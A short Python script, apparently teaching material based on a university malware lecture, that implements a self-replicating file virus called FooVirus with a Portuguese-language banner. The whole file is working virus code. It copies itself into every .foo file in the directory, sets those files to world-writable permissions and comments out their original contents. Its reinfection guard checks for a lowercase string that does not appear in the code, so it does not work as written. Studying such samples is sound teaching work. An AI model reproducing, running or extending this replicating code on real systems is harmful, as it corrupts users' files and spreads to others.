#!/usr/bin/env python 
import sys
import os
import glob


##   FooVirus.py
## Based in a version of Avi kak (kak@purdue.edu) - Lecture 22 Malware Viruses and Worms Purdue University - pages 11 and 12
## Date: April 5, 2016; Updated April 6, 2022


print("""\nHELLO FROM FooVirus\n\n
Esta é uma demonstração de como é fácil escrever um programa autorreplicante. Este vírus infectará todos os arquivos com nomes terminados em .foo no diretório onde você executar um arquivo infectado. Se você enviar um arquivo infectado para outra pessoa e ela executá-lo, os arquivos .foo dela também serão danificados.
Observe que este é um vírus seguro (apenas para fins educacionais), pois ele não carrega uma carga útil prejudicial. Tudo o que ele faz é imprimir esta mensagem e comentar o código nos arquivos .foo.\n\n""")

IN = open(sys.argv[0], 'r')

virus = [line for (i,line) in enumerate(IN) if i < 37]

for item in glob.glob("*.foo"): 
    IN = open(item, 'r') 
    all_of_it = IN.readlines() 
    IN.close()

    if any('foovirus' in line for line in all_of_it): continue 
    os.chmod(item, 0o777)
    OUT = open(item, 'w')
    OUT.writelines(virus)
    all_of_it = ['#' + line for line in all_of_it] 
    OUT.writelines(all_of_it)
    OUT.close()